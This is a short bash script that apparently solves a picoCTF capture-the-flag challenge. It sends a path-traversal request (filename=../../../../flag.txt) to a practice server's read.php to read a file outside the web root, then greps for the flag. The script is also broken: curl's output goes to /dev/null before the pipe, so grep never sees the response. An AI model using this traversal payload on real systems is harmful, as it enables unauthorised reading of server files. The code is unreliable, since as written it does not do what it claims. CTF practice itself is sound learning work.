#!/bin/bash
curl -X POST "http://saturn.picoctf.net:52472/read.php" -d filename=../../../../flag.txt >/dev/null 2>&1 | grep -ho "picoCTF{.*}"
